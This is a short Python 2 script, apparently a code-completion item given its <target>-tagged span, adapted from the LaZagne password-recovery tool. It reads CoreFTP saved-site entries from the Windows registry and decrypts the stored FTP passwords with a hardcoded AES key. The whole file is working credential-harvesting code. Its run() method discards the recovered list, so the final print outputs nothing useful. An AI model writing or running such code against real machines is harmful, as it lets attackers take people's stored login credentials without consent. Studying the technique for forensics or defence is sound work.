# Inspired from https://github.com/AlessandroZ/LaZagne

import binascii
from Crypto.Cipher import AES
import win32con, win32api


class CoreFTP():
    def __init__(self):
        self

    def get_secret(self):
        return "hdfzpysvpzimorhk"

    def decrypt(self, hex):
        encoded = binascii.unhexlify(hex)
        secret = self.get_secret()
<target>
        BLOCK_SIZE = 16
        mode = AES.MODE_ECB
        cipher = AES.new(secret, mode)
</target>
        return cipher.decrypt(encoded).split('\x00')[0]

    def get_key_info(self):
        accessRead = win32con.KEY_READ | win32con.KEY_ENUMERATE_SUB_KEYS | win32con.KEY_QUERY_VALUE
        try:
            key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, 'Software\\FTPware\\CoreFTP\\Sites', 0, accessRead)
        except Exception, e:
            return False

        num_profiles = win32api.RegQueryInfoKey(key)[0]
        pwdFound = []
        for n in range(num_profiles):
            name_skey = win32api.RegEnumKey(key, n)

            skey = win32api.RegOpenKey(key, name_skey, 0, accessRead)
            num = win32api.RegQueryInfoKey(skey)[1]

            values = {}
            for nn in range(num):
                k = win32api.RegEnumValue(skey, nn)
                if k[0] == 'Host':
                    values['Host'] = k[1]
                if k[0] == 'Port':
                    values['Port'] = k[1]
                if k[0] == 'User':
                    values['User'] = k[1]
                    pwdFound.append(values)
                if k[0] == 'PW':
                    try:
                        values['Password'] = self.decrypt(k[1])
                    except Exception, e:
                        values['Password'] = 'N/A'
        # print the results
        return pwdFound

    def run(self):

        if self.get_key_info() == False:
            pass

tem = CoreFTP()
a= tem.run()
print a